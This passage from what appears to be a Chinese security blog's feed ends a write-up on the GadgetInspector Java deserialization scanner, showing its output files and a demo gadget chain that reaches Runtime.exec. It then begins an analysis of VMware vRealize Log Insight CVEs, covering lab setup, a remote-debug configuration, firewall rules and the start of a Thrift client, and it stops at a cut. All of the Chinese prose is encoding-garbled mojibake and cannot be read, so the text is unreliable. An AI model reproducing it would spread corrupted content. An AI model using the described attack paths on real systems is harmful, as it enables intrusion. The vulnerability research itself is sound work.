class="hljs-regexp">/example/</span>TestDemocMethod(Ljava<span class="hljs-regexp">/lang/</span>String;)Ljava<span class="hljs-regexp">/lang/</span>String;<span class="hljs-keyword">false</span><br></code></pre></td></tr></table></figure><table><thead><tr><th>æ–¹æ³•æ‰€åœ¨ç±»</th><th>æ–¹æ³•å</th><th>æ–¹æ³•å‚æ•°åŠè¿”å›å€¼</th><th>æ˜¯å¦é™æ€æ–¹æ³•</th></tr></thead><tbody><tr><td>org&#x2F;example&#x2F;FnCompose</td><td>invokeCall</td><td>(Ljava&#x2F;lang&#x2F;Object;)Ljava&#x2F;lang&#x2F;Object;</td><td>false</td></tr></tbody></table><p>åœ¨gadgetinspectorä¸­çš„å®šä¹‰ç±»ä¸ºgadgetinspector.data.MethodReference</p><p><img src="/img/Research-on-GadgetInspector-of-Static-Code-Scanning-Tool/45.png"></p><p>inheritanceMap.dat  ç±»çš„ç»§æ‰¿å…³ç³»</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs awk">org<span class="hljs-regexp">/example/m</span>odel<span class="hljs-regexp">/AbstractTableModeljava/</span>lang<span class="hljs-regexp">/Objectjava/i</span>o/Serializable<br>org<span class="hljs-regexp">/example/</span>FnComposejava<span class="hljs-regexp">/lang/</span>Objectjava<span class="hljs-regexp">/io/</span>Serializableorg<span class="hljs-regexp">/example/</span>IFn<br>org<span class="hljs-regexp">/example/</span>FnEvaljava<span class="hljs-regexp">/lang/</span>Objectjava<span class="hljs-regexp">/io/</span>Serializableorg<span class="hljs-regexp">/example/</span>IFn<br>org<span class="hljs-regexp">/example/</span>TestDemojava<span class="hljs-regexp">/lang/</span>Object<br>org<span class="hljs-regexp">/example/</span>FnConstantjava<span class="hljs-regexp">/lang/</span>Objectjava<span class="hljs-regexp">/io/</span>Serializableorg<span class="hljs-regexp">/example/</span>IFn<br>org<span class="hljs-regexp">/example/</span>IFnjava<span class="hljs-regexp">/lang/</span>Object<br></code></pre></td></tr></table></figure><p>2ã€ç”Ÿæˆpassthroughæ•°æ®æµï¼Œè¾“å‡ºä¿¡æ¯æ–‡ä»¶passthrough.dat</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">org<span class="hljs-regexp">/example/</span>TestDemocMethod(Ljava<span class="hljs-regexp">/lang/</span>String;)Ljava<span class="hljs-regexp">/lang/</span>String;<span class="hljs-number">1</span>,<br>org<span class="hljs-regexp">/example/</span>TestDemopMethod(Ljava<span class="hljs-regexp">/lang/</span>String;)Ljava<span class="hljs-regexp">/lang/</span>String;<span class="hljs-number">1</span>,<br>org<span class="hljs-regexp">/example/</span>FnConstantinvokeCall(Ljava<span class="hljs-regexp">/lang/</span>Object;)Ljava<span class="hljs-regexp">/lang/</span>Object;<span class="hljs-number">0</span>,   <span class="hljs-number">0</span>æ˜¯å®ä¾‹<br></code></pre></td></tr></table></figure><table><thead><tr><th>ç±»å</th><th>æ–¹æ³•å</th><th>æ–¹æ³•æè¿°</th><th>èƒ½æ±¡æŸ“çš„å‚æ•°1ç´¢å¼•,èƒ½æ±¡æŸ“çš„å‚æ•°2ç´¢å¼•</th></tr></thead><tbody><tr><td>org&#x2F;example&#x2F;TestDemo</td><td>cMethod</td><td>(Ljava&#x2F;lang&#x2F;String;)Ljava&#x2F;lang&#x2F;String;</td><td>1,</td></tr></tbody></table><p>3ã€ç”Ÿæˆpassthroughè°ƒç”¨å›¾ï¼Œè¾“å‡ºä¿¡æ¯æ–‡ä»¶callgraph.dat</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs gradle">org<span class="hljs-regexp">/example/m</span>odel<span class="hljs-regexp">/AbstractTableModelhashCode()Iorg/</span>example<span class="hljs-regexp">/IFninvokeCall(Ljava/</span>lang<span class="hljs-regexp">/Object;)Ljava/</span>lang/Object;<span class="hljs-number">0</span>__clojureFnMap<span class="hljs-number">0</span><br>org<span class="hljs-regexp">/example/m</span>odel<span class="hljs-regexp">/AbstractTableModelhashCode()Ijava/u</span>til/HashMaphashCode()I<span class="hljs-number">0</span>__clojureFnMap<span class="hljs-number">0</span><br>org<span class="hljs-regexp">/example/</span>TestDemopMethod(Ljava<span class="hljs-regexp">/lang/</span>String;)Ljava<span class="hljs-regexp">/lang/</span>String;org<span class="hljs-regexp">/example/</span>TestDemocMethod(Ljava<span class="hljs-regexp">/lang/</span>String;)Ljava<span class="hljs-regexp">/lang/</span>String;<span class="hljs-number">1</span><span class="hljs-number">1</span><br>org<span class="hljs-regexp">/example/</span>TestDemopMethod(Ljava<span class="hljs-regexp">/lang/</span>String;)Ljava<span class="hljs-regexp">/lang/</span>String;org<span class="hljs-regexp">/example/</span>TestDemocMethod(Ljava<span class="hljs-regexp">/lang/</span>String;)Ljava<span class="hljs-regexp">/lang/</span>String;<span class="hljs-number">0</span><span class="hljs-number">0</span><br>org<span class="hljs-regexp">/example/</span>TestDemocMethod(Ljava<span class="hljs-regexp">/lang/</span>String;)Ljava<span class="hljs-regexp">/lang/</span>String;java<span class="hljs-regexp">/lang/</span>StringtoUpperCase()Ljava<span class="hljs-regexp">/lang/</span>String;<span class="hljs-number">1</span><span class="hljs-number">0</span><br>org<span class="hljs-regexp">/example/</span>FnCompose&lt;init&gt;(Lorg<span class="hljs-regexp">/example/I</span>Fn;Lorg<span class="hljs-regexp">/example/I</span>Fn;)Vjava<span class="hljs-regexp">/lang/</span>Object&lt;init&gt;()V<span class="hljs-number">0</span><span class="hljs-number">0</span><br>org<span class="hljs-regexp">/example/m</span>odel<span class="hljs-regexp">/AbstractTableModel&lt;init&gt;(Ljava/u</span>til<span class="hljs-regexp">/HashMap;)Vjava/</span>lang/Object&lt;init&gt;()V<span class="hljs-number">0</span><span class="hljs-number">0</span><br>org<span class="hljs-regexp">/example/</span>FnEvalinvokeCall(Ljava<span class="hljs-regexp">/lang/</span>Object;)Ljava<span class="hljs-regexp">/lang/</span>Object;java<span class="hljs-regexp">/lang/</span><span class="hljs-keyword">Runtime</span>exec(Ljava<span class="hljs-regexp">/lang/</span>String;)Ljava<span class="hljs-regexp">/lang/</span>Process;<span class="hljs-number">1</span><span class="hljs-number">1</span><br>org<span class="hljs-regexp">/example/</span>FnComposeinvokeCall(Ljava<span class="hljs-regexp">/lang/</span>Object;)Ljava<span class="hljs-regexp">/lang/</span>Object;org<span class="hljs-regexp">/example/I</span>FninvokeCall(Ljava<span class="hljs-regexp">/lang/</span>Object;)Ljava<span class="hljs-regexp">/lang/</span>Object;<span class="hljs-number">1</span><span class="hljs-number">1</span><br>org<span class="hljs-regexp">/example/m</span>odel<span class="hljs-regexp">/AbstractTableModelhashCode()Ijava/u</span>til<span class="hljs-regexp">/HashMapget(Ljava/</span>lang<span class="hljs-regexp">/Object;)Ljava/</span>lang/Object;<span class="hljs-number">0</span>__clojureFnMap<span class="hljs-number">0</span><br>org<span class="hljs-regexp">/example/</span>TestDemo&lt;init&gt;()Vjava<span class="hljs-regexp">/lang/</span>Object&lt;init&gt;()V<span class="hljs-number">0</span><span class="hljs-number">0</span><br>org<span class="hljs-regexp">/example/</span>FnComposeinvokeCall(Ljava<span class="hljs-regexp">/lang/</span>Object;)Ljava<span class="hljs-regexp">/lang/</span>Object;org<span class="hljs-regexp">/example/I</span>FninvokeCall(Ljava<span class="hljs-regexp">/lang/</span>Object;)Ljava<span class="hljs-regexp">/lang/</span>Object;<span class="hljs-number">0</span>f2<span class="hljs-number">0</span><br>org<span class="hljs-regexp">/example/</span>FnComposeinvokeCall(Ljava<span class="hljs-regexp">/lang/</span>Object;)Ljava<span class="hljs-regexp">/lang/</span>Object;org<span class="hljs-regexp">/example/I</span>FninvokeCall(Ljava<span class="hljs-regexp">/lang/</span>Object;)Ljava<span class="hljs-regexp">/lang/</span>Object;<span class="hljs-number">0</span>f1<span class="hljs-number">0</span><br>org<span class="hljs-regexp">/example/</span>FnEval&lt;init&gt;()Vjava<span class="hljs-regexp">/lang/</span>Object&lt;init&gt;()V<span class="hljs-number">0</span><span class="hljs-number">0</span><br>org<span class="hljs-regexp">/example/m</span>odel<span class="hljs-regexp">/AbstractTableModelhashCode()Iorg/</span>example<span class="hljs-regexp">/IFninvokeCall(Ljava/</span>lang<span class="hljs-regexp">/Object;)Ljava/</span>lang/Object;<span class="hljs-number">0</span><span class="hljs-number">1</span><br>org<span class="hljs-regexp">/example/</span>FnConstant&lt;init&gt;(Ljava<span class="hljs-regexp">/lang/</span>Object;)Vjava<span class="hljs-regexp">/lang/</span>Object&lt;init&gt;()V<span class="hljs-number">0</span><span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><p>4ã€æœç´¢å¯ç”¨çš„sourceï¼Œè¾“å‡ºä¿¡æ¯æ–‡ä»¶sources.dat</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">org<span class="hljs-regexp">/example/m</span>odel/AbstractTableModelhashCode()I<span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><p>5ã€æœç´¢ç”Ÿæˆè°ƒç”¨é“¾ï¼Œè¾“å‡ºç»“æœæ–‡ä»¶gadget-chains.txt</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">org/apache/log4j/pattern/LogEvent.readObject(Ljava/io/ObjectInputStream;)V (1)<br>  org/apache/log4j/pattern/LogEvent.readLevel(Ljava/io/ObjectInputStream;)V (1)<br>  java/lang/reflect/Method.invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object; (0)<br><br>org/apache/log4j/spi/LoggingEvent.readObject(Ljava/io/ObjectInputStream;)V (1)<br>  org/apache/log4j/spi/LoggingEvent.readLevel(Ljava/io/ObjectInputStream;)V (1)<br>  java/lang/reflect/Method.invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object; (0)<br><br>//æœ€ç»ˆç”Ÿæˆçš„ååºåˆ—åŒ–é“¾<br>org/example/model/AbstractTableModel.hashCode()I (0)<br>  org/example/FnEval.invokeCall(Ljava/lang/Object;)Ljava/lang/Object; (1)<br>  java/lang/Runtime.<span class="hljs-built_in">exec</span>(Ljava/lang/String;)Ljava/lang/Process; (1)<br><br></code></pre></td></tr></table></figure><p><img src="/img/Research-on-GadgetInspector-of-Static-Code-Scanning-Tool/46.png"></p><h2 id="4ã€æ€»ç»“"><a href="#4ã€æ€»ç»“" class="headerlink" title="4ã€æ€»ç»“"></a>4ã€æ€»ç»“</h2><p>åœ¨èŠ±äº†å‡ å‘¨æ—¶é—´åˆ†æå®Œè¯¥é¡¹ç›®åï¼Œå¯¹äºåˆ©ç”¨ASMæŠ€æœ¯ã€JVMæŒ‡ä»¤ã€æ¨¡æ‹Ÿæ ˆè°ƒç”¨ç­‰è§£å†³é™æ€æ‰«æçš„é—®é¢˜æœ‰äº†ä¸€äº›è®¤çŸ¥äº†è§£ã€‚å½“ç„¶åœ¨åˆ†æè¿‡ç¨‹ä¸­ä¹Ÿå‘ç°è¯¥å·¥å…·çš„ä¸€äº›å¼Šç«¯æˆ–è€…è¯´æ˜¯bugï¼Œå¦‚Transientä¿®é¥°å­—æ®µå¤„ç†é€»è¾‘ã€å¹¿åº¦ä¼˜å…ˆçš„æœç´¢ç­–ç•¥ã€sourceæº&#x2F;sinkæºä¸å®Œå–„ç­‰é—®é¢˜ã€‚è€Œææ¸…æ¥šé—®é¢˜ä¹‹åä¸‹ä¸€æ­¥å°±æ˜¯è§£å†³é—®é¢˜ã€å®Œå–„ä»£ç é€»è¾‘ã€‚å¦å¤–GadgetInspectorç›´æ¥åˆ†æwar&#x2F;jarçš„æ–¹å¼æ¯”è¾ƒè´´åˆå¹³æ—¶åšæ¼æ´æŒ–æ˜çš„å·¥ä½œåœºæ™¯ï¼Œå¦‚åœ¨ä¸€çº¿æ”»é˜²æ¼”ç»ƒæ—¶æ‹¿åˆ°äº†java waråŒ…ï¼Œç”±äºé¡¹ç›®å‘¨æœŸçŸ­ å¯èƒ½æ€¥éœ€ä¸€ä¸ªç‚¹æ’•å¼€é˜²å®ˆçš„å£å­ï¼Œè¿™æ—¶å€™æ‰«æå·¥å…·å¯ä»¥å¸®åŠ©æˆ‘ä»¬å¿«é€Ÿåšä¸€äº›åŸºç¡€åˆ†æçš„å·¥ä½œï¼ŒåŸºäºæˆ‘ä»¬æå‰æŒ‡å®šçš„sourceæºã€sinkæ¼æ´ç‚¹åˆ†ææ‹¿åˆ°é¡¹ç›®çš„æ‰€æœ‰è·¯ç”±ã€å¯èƒ½å­˜åœ¨çš„æ”»å‡»é“¾è·¯ï¼Œè€Œå…·ä½“æ¼æ´EXPåˆ©ç”¨çš„æ„é€ äº¤ç»™æˆ‘ä»¬è‡ªå·±ã€‚ç›¸ä¿¡éšç€è§„åˆ™çš„å®Œå–„ï¼Œä¹Ÿä¼šå¾ˆå¤§çš„è¾…åŠ©å¢å¼ºæˆ‘ä»¬å®¡è®¡æŒ–æ˜çš„æ•ˆç‡ã€‚æ‰€ä»¥åœ¨å®Œå–„gadgetçš„æ‰«æé€»è¾‘åä¹Ÿè€ƒè™‘åŸºäºæ­¤å·¥å…·äºŒå¼€ä»¥ç®€åŒ–å¹³æ—¶ä¸€äº›å¸¸è§„æ¼æ´çš„æŒ–æ˜å®¡è®¡å·¥ä½œã€‚å†™åˆ°è¿™é‡Œ æˆæ–‡å·²ç»åˆè‡­åˆé•¿ï¼Œä¸å†èµ˜è¿°äº†ã€‚ä¸‹ä¸€æ­¥çš„todo-listå°±æ˜¯ç€é‡ä»£ç é€»è¾‘å®Œå–„ã€è§„åˆ™ä¼˜åŒ–ã€å¸¸è§„æ¼æ´æŒ–æ˜ç­‰ç›¸å…³é—®é¢˜ã€‚å®‰å…¨è·¯æ¼«æ¼«~</p>]]></content>
    
    
    <categories>
      
      <category>è‡ªåŠ¨åŒ–å®¡è®¡</category>
      
    </categories>
    
    
    <tags>
      
      <tag>JavaSec</tag>
      
      <tag>é™æ€åˆ†æ</tag>
      
      <tag>GadgetInspector</tag>
      
      <tag>è‡ªåŠ¨åŒ–å®¡è®¡</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>VMware-vRealize-Log-Insight-CVEæ¼æ´è¿½è¸ª</title>
    <link href="/2023/Research-VMware-vRealize-Log-Insight-CVE-vulnerability/"/>
    <url>/2023/Research-VMware-vRealize-Log-Insight-CVE-vulnerability/</url>
    
    <content type="html"><![CDATA[<blockquote><p>23å¹´1æœˆä»½ï¼Œvmwareå®˜æ–¹å‘å¸ƒäº†å¼€å¹´ç¬¬ä¸€ä»½å®‰å…¨é€šå‘ŠVMSA-2023-0001ï¼Œä¿®å¤äº†VMware-vRealize-Log-Insight äº§å“ä¸­çš„4ä¸ªæ¼æ´ï¼Œå…¶ä¸­CVE-2022-31704ã€CVE-2022-31711ã€CVE-2022-31706å¯ç»„åˆè¾¾åˆ°rceçš„æ•ˆæœã€‚è¿‘æœŸç›¸å…³å‚å•†å…¬å¸ƒäº†æ¼æ´çš„ç»†èŠ‚åŠæ£€æµ‹çš„POCï¼Œæˆ‘ä¹Ÿå°†å½“æ—¶çš„åˆ†ææ€è·¯æ•´ç†è„±æ•æˆæ–‡å‘å‡ºæ¥ã€‚å½“ä¸­æ¶‰åŠåˆ°äº†Apache thriftã€rpcè°ƒç”¨ã€python tarfileè§£å‹ç›®å½•ç©¿è¶Šç­‰çŸ¥è¯†ã€‚æœ¬æ–‡ä¸æä¾›ä»»ä½•ä¸æ¼æ´ç›¸å…³çš„POCåŠEXPï¼Œæ–‡ç« ä»…ç”¨äºæŠ€æœ¯äº¤æµï¼Œè¯·å‹¿ç”¨äºéæ³•ç”¨é€”ï¼</p></blockquote><p>æœ¬æ–‡æ¶‰åŠçš„å…¨éƒ¨æ¼æ´ï¼Œå®˜æ–¹å‡å·²å®Œå…¨ä¿®å¤ï¼Œäº§å“æ‰€å±å‚å•†ä¹Ÿå·²å‘å¸ƒå®‰å…¨å…¬å‘ŠåŠä¿®å¤ç‰ˆæœ¬</p><p>å®‰å…¨å…¬å‘Šï¼š<a href="https://www.vmware.com/security/advisories/VMSA-2023-0001.html">https://www.vmware.com/security/advisories/VMSA-2023-0001.html</a></p><p>ä¿®å¤ç‰ˆæœ¬ï¼š VMware vRealize Log Insight 8.10.2ï¼Œåœ°å€ï¼š<a href="https://customerconnect.vmware.com/downloads/details?downloadGroup=VRLI-8102&amp;productId=1351">https://customerconnect.vmware.com/downloads/details?downloadGroup=VRLI-8102&amp;productId=1351</a></p><p> <strong>PSï¼šæœ¬æ–‡ä»…ç”¨äºæŠ€æœ¯è®¨è®ºã€‚ä¸¥ç¦ç”¨äºä»»ä½•éæ³•ç”¨é€”ï¼Œè¿è€…åæœè‡ªè´Ÿã€‚</strong></p><h2 id="1ã€ç¯å¢ƒéƒ¨ç½²"><a href="#1ã€ç¯å¢ƒéƒ¨ç½²" class="headerlink" title="1ã€ç¯å¢ƒéƒ¨ç½²"></a>1ã€ç¯å¢ƒéƒ¨ç½²</h2><p>å®˜æ–¹ä¸‹è½½VMware-vRealize-Log-Insight-8.10.0.0-20623770_OVF10.ovaï¼Œå¯¼å…¥vmwareå¯åŠ¨éƒ¨ç½²</p><p><a href="https://192.168.232.200/admin/startup?view=deployment">https://192.168.232.200/admin/startup?view=deployment</a></p><p><img src="/img/Research-VMware-vRealize-Log-Insight-CVE-vulnerability/1.png"></p><p>ä¿å­˜é…ç½®ä¸‹ä¸€æ­¥åæˆåŠŸå¯åŠ¨</p><p><img src="/img/Research-VMware-vRealize-Log-Insight-CVE-vulnerability/2.png"></p><p>æ­å»ºæˆåŠŸ</p><p><img src="/img/Research-VMware-vRealize-Log-Insight-CVE-vulnerability/3.png"></p><h2 id="2ã€ç¯å¢ƒè°ƒè¯•"><a href="#2ã€ç¯å¢ƒè°ƒè¯•" class="headerlink" title="2ã€ç¯å¢ƒè°ƒè¯•"></a>2ã€ç¯å¢ƒè°ƒè¯•</h2><p>ä¸å…¶å®ƒç¯å¢ƒæ— å·®åˆ«ï¼Œæ‰¾å¯åŠ¨è„šæœ¬ï¼Œæ·»åŠ è°ƒè¯•é…ç½®åé‡æ–°å¯åŠ¨</p><p>ä¿®æ”¹å¯åŠ¨è„šæœ¬ï¼š&#x2F;usr&#x2F;lib&#x2F;loginsight&#x2F;application&#x2F;sbin&#x2F;loginsight-daemon.sh</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs shell">1ã€å°†è¿™å‡ è¡Œæ³¨é‡Š<br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-keyword">if</span> [ -z <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;STRATA_PGID&#125;</span>&quot;</span> ]; <span class="hljs-keyword">then</span></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">   <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Cannot determine Strata service process group ID.&quot;</span> &gt; /dev/stderr</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">   <span class="hljs-built_in">exit</span> 1</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-keyword">fi</span></span><br><br>2ã€æ·»åŠ è°ƒè¯•è¯­å¥<br>-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=5005 \<br><br>3ã€killæ‰è¿›ç¨‹å¹¶é‡å¯<br>netstat -anltp|grep 16520<br>kill -9 pid<br><span class="hljs-meta prompt_">[/usr/lib/loginsight/application/sbin]#</span><span class="language-bash">./loginsight-daemon.sh</span><br><br>4ã€ä¸Šè¿°æ“ä½œå®Œç­‰å‡ åˆ†é’Ÿå°±èƒ½çœ‹åˆ°16520ã€5005ç«¯å£éƒ½å¼€èµ·æ¥äº†ï¼Œiptablesæ”¾è¡Œç«¯å£<br>iptables -A INPUT -p tcp --dport 5005 -j ACCEPT<br>iptables -A OUTPUT -p tcp --sport 5005 -j ACCEPT<br></code></pre></td></tr></table></figure><p><img src="/img/Research-VMware-vRealize-Log-Insight-CVE-vulnerability/4.png"></p><p>ideaè¿œç¨‹è°ƒè¯•è¿æ¥å³å¯</p><p><img src="/img/Research-VMware-vRealize-Log-Insight-CVE-vulnerability/5.png"></p><h2 id="3ã€å®˜æ–¹å…¬å‘Š"><a href="#3ã€å®˜æ–¹å…¬å‘Š" class="headerlink" title="3ã€å®˜æ–¹å…¬å‘Š"></a>3ã€å®˜æ–¹å…¬å‘Š</h2><p><a href="https://www.vmware.com/security/advisories/VMSA-2023-0001.html">https://www.vmware.com/security/advisories/VMSA-2023-0001.html</a></p><p>ä¸€å…±4ä¸ªæ¼æ´</p><p>CVE-2022-31706 ç›®å½•éå†</p><p>CVE-2022-31704 å¤±æ•ˆçš„è®¿é—®æ§åˆ¶</p><p>CVE-2022-31710 ååºåˆ—åŒ–ï¼Œå¯èƒ½å¯¼è‡´æ‹’ç»æœåŠ¡</p><p>CVE-2022-31711  ä¿¡æ¯æ³„éœ²ï¼Œå¯æ”¶é›†æ•æ„Ÿä¼šè¯å’Œåº”ç”¨ç¨‹åºä¿¡æ¯ </p><p>æ¼æ´ç‰ˆæœ¬ï¼š8.10.0ã€å®‰å…¨ä¿®å¤ç‰ˆæœ¬ï¼š8.10.2ï¼Œä»¥ä¸‹åˆ†æéƒ½æ˜¯åŸºäºVMware-vRealize-Log-Insight-8.10.0.0-20623770ç‰ˆæœ¬</p><h2 id="4ã€æ¼æ´è¿½è¸ª"><a href="#4ã€æ¼æ´è¿½è¸ª" class="headerlink" title="4ã€æ¼æ´è¿½è¸ª"></a>4ã€æ¼æ´è¿½è¸ª</h2><p>ç”±äºæ²¡æˆæƒä¸‹è½½ä¸åˆ°æ¼æ´å¯¹åº”çš„è¡¥ä¸åŒ…ï¼Œæ²¡æ³•ç›´æ¥ä»ä¿®å¤æ–¹æ¡ˆå…¥æ‰‹ã€‚ä»horizon3çš„<a href="https://www.horizon3.ai/vmware-vrealize-cve-2022-31706-iocs/">https://www.horizon3.ai/vmware-vrealize-cve-2022-31706-iocs/</a> çœ‹åˆ°æœ‰å‡ ä¸ªå…³é”®è¯ï¼šç«¯å£16520-16580ã€thriftã€tarã€pak</p><p><img src="/img/Research-VMware-vRealize-Log-Insight-CVE-vulnerability/6.png"></p><p>æ ¹æ®Apache thriftå®˜æ–¹å‡ºçš„ç¤ºä¾‹ï¼š<a href="https://thrift.apache.org/tutorial/java.html">https://thrift.apache.org/tutorial/java.html</a> å®Œæ•´çš„ä¸€æ¬¡RPCè°ƒç”¨è¿‡ç¨‹å­˜åœ¨clientã€serverã€handlerå‡ ä¸ªå…³é”®ç±»( <a href="https://gitbox.apache.org/repos/asf?p=thrift.git;a=tree;f=tutorial/java/src;hb=HEAD">https://gitbox.apache.org/repos/asf?p=thrift.git;a=tree;f=tutorial/java/src;hb=HEAD</a> )ã€‚æ–¹æ³•çš„å®šä¹‰åœ¨Ifaceæ¥å£ä¸­ã€æ–¹æ³•çš„å®ç°åœ¨handlerç±»ä¸­ï¼Œå¼€å‘è€…å¯ä»¥é€šè¿‡ç¼–å†™**.thriftæ–‡ä»¶**ç”Ÿæˆclientã€serverç±»ä»£ç ï¼›ä¹Ÿå¯ä»¥æ ¹æ®å®ä¾‹ç¼–å†™clientåŠserverç±»ã€‚æœ¬æ¬¡å¤ç°æ¼æ´åªéœ€è¦clientç±»èƒ½å¤Ÿè°ƒç”¨ç›®æ ‡æ–¹æ³•å³å¯ï¼Œæ‰€ä»¥å‚è€ƒç¤ºä¾‹å†™äº†ä¸€ä¸ªclientç±»(è§åæ–‡)</p><p><img src="/img/Research-VMware-vRealize-Log-Insight-CVE-vulnerability/7.png"></p><p>pidä¸º16520çš„javaè¿›ç¨‹å¯åŠ¨å‚æ•°ï¼š</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-regexp">/usr/</span>lib<span class="hljs-regexp">/loginsight/</span>application<span class="hljs-regexp">/3rd_party/</span>bin<span class="hljs-regexp">/java -Xrs -XX:+HeapDumpOnOutOfMemoryError -XX:HeapDumpPath=/</span>storage<span class="hljs-regexp">/core/</span>loginsight<span class="hljs-regexp">/var/</span>heapdump<span class="hljs-regexp">/li_heapdump.hprof -XX:ErrorFile=/</span>storage<span class="hljs-regexp">/core/</span>loginsight<span class="hljs-regexp">/var/</span>jvm_hs_err_pid.log <br>-Djava.util.logging.config.level=SEVERE -Djdk.tls.ephemeralDHKeySize=<span class="hljs-number">2048</span> <br>-Dorg.bouncycastle.fips.approved_only=<span class="hljs-keyword">false</span> -Djavax.net.ssl.trustStorePassword=changeit -Djdk.http.auth.tunneling.disabledSchemes=<span class="hljs-string">&quot;&quot;</span> -DLOGINSIGHT_HOME=<span class="hljs-regexp">/usr/</span>lib<span class="hljs-regexp">/loginsight -Dstrata.pgid=2020 -cp /u</span>sr<span class="hljs-regexp">/lib/</span>loginsight<span class="hljs-regexp">/application/</span>lib<span class="hljs-comment">/* </span><br><span class="hljs-comment">-Xmx3988m -Xms3988m -Xss256k -Xmn1024M -XX:+UseConcMarkSweepGC -XX:+UseParNewGC -XX:CMSInitiatingOccupancyFraction=75 -XX:+UseCMSInitiatingOccupancyOnly -XX:+ScavengeBeforeFullGC -XX:TargetSurvivorRatio=80 -XX:SurvivorRatio=8 -XX:MaxTenuringThreshold=15 -XX:ParallelGCThreads=4 -XX:+UseCompressedOops -XX:+OptimizeStringConcat -XX:+AlwaysPreTouch -agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=5005 com.vmware.loginsight.daemon.LogInsightDaemon </span><br><span class="hljs-comment">--wait=120</span><br></code></pre></td></tr></table></figure><p>å¯åŠ¨ç±»ä¸ºcom.vmware.loginsight.daemon.LogInsightDaemonï¼Œå®šä¹‰åœ¨&#x2F;application&#x2F;lib&#x2F;daemon-service-li.jarä¸­ï¼Œçœ‹mainæ–¹æ³•çš„ä»£ç ï¼šå‰é¢è¿›è¡Œä¸€ç³»åˆ—configé…ç½®ï¼Œæœ€åè¿›å…¥åŒç±»ä¸‹çš„runæ–¹æ³•è¿›è¡Œå¯åŠ¨</p><p><img src="/img/Research-VMware-vRealize-Log-Insight-CVE-vulnerability/8.png"></p><p>com.vmware.loginsight.daemon.LogInsightDaemon#runè°ƒç”¨åŒç±»ä¸‹çš„startThriftServerå¯åŠ¨æœåŠ¡</p><p><img src="/img/Research-VMware-vRealize-Log-Insight-CVE-vulnerability/9.png"></p><p>è¿™é‡Œä¼ å…¥DaemonCommandsHandlerå¯¹è±¡ï¼Œè¿™ä¸ªç±»å°±æ˜¯æˆ‘ä»¬ä¸Šé¢æåˆ°çš„handlerç±»ï¼Œå…¶å®ç°äº†Ifaceæ¥å£</p><p><img src="/img/Research-VMware-vRealize-Log-Insight-CVE-vulnerability/10.png"></p><p><img src="/img/Research-VMware-vRealize-Log-Insight-CVE-vulnerability/11.png"></p><p>å®¢æˆ·ç«¯å¯è°ƒç”¨çš„æ–¹æ³•éƒ½åœ¨Ifaceæ¥å£ä¸­å®šä¹‰ï¼Œè€Œåœ¨DaemonCommandsHandlerç±»ä¸­å®ç°æ–¹æ³•é€»è¾‘</p><p><img src="/img/Research-VMware-vRealize-Log-Insight-CVE-vulnerability/12.png"></p><p><img src="/img/Research-VMware-vRealize-Log-Insight-CVE-vulnerability/13.png"></p><p>é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥çŒœæµ‹ CVE-2022-31704 è®¿é—®æ§åˆ¶å¤±æ•ˆæ¼æ´æŒ‡çš„æ˜¯æœªæˆæƒç”¨æˆ·å¯ä»¥rpcè°ƒç”¨æœåŠ¡ç«¯æä¾›çš„æ–¹æ³•ï¼å…ˆæµ‹è¯•ä¸‹</p><p>æŒ‰ç…§å®˜ç½‘æä¾›çš„ç¤ºä¾‹ä»£ç ( <a href="https://thrift.apache.org/tutorial/java.html">https://thrift.apache.org/tutorial/java.html</a> )ï¼Œè‡ªå·±å†™ä¸€ä¸ªclientè°ƒç”¨ä¸‹getClusterCertificateæ–¹æ³•</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">TTransport transport;<br>transport = <span 